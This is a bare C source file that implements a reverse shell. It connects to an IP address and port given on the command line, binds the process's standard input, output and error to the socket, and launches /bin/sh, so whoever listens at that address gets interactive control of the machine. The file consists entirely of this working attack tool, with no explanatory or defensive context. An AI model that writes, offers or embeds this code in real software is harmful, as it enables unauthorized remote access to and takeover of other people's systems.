#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define SOCKADDR        struct sockaddr
#define SOCKADDR_IN     struct sockaddr_in


int main(int argc, char** argv)
{

    int connfd;
    SOCKADDR_IN servAddr = {sizeof(SOCKADDR_IN)};

    if( argc != 3){
        printf("usage: ./%s ip port\n",argv[0]);
        exit(-1);
    }

    servAddr.sin_family = AF_INET;
    inet_pton(AF_INET, argv[1],&servAddr.sin_addr);
    servAddr.sin_port = htons(atoi(argv[2]));

    if(-1 == (connfd = socket(AF_INET,SOCK_STREAM,0))){
        perror("socket");
        return -1;
    }
    if(-1 == connect(connfd,(SOCKADDR*)&servAddr,sizeof(SOCKADDR))){
        perror("connect");
        return -1;
    }

    dup2(connfd,0);
    dup2(connfd,1);
    dup2(connfd,2);
    execve("/bin/sh",NULL,NULL);
    return 0;
}
